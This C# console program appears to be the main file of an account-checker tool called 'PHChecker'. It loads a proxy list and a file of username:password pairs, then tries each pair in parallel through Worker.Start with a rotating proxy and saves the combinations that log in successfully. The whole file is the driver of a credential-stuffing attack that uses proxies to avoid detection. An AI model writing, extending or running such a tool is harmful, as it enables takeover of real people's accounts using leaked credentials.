// See https://aka.ms/new-console-template for more information
using PHChecker;
using System.Collections;

Console.WriteLine("Enter path to proxy:");
string ProxyPath = Console.ReadLine();

Queue queue = new Queue();

if (ProxyPath != "" && ProxyPath.Length > 6)
{
    foreach (string s in File.ReadAllLines(ProxyPath))
    {
        queue.Enqueue(s);
    }
}

Console.WriteLine("Enter path to base:");
string BasePath = Console.ReadLine();

LogBuilder lb = new();
Structures.ThreadInProgress = 0;

foreach (string s in File.ReadAllLines(BasePath))
{
    Structures.ThreadInProgress += 1;
    Task.Run(() =>
    {
        try
        {
            string[] data = s.Split(':');
            Response rsp = Worker.Start(new UserData { username = data[0], password = data[1] }, queue.ToArray().Length > 0 ? queue.Dequeue().ToString() : null);
            if (rsp.Success)
            {
                lb.Add(s, rsp);
            }
            Structures.ThreadInProgress -= 1;
        }
        catch { Structures.ThreadInProgress -= 1; }
    });
}

while (Structures.ThreadInProgress > 0)
{
    Console.WriteLine("Waiting...");
    Thread.Sleep(1000);
}

Console.WriteLine("Saving log...");
lb.Save();
Console.WriteLine("Saved!");
Console.WriteLine("Press any key for exit...");
Console.ReadKey();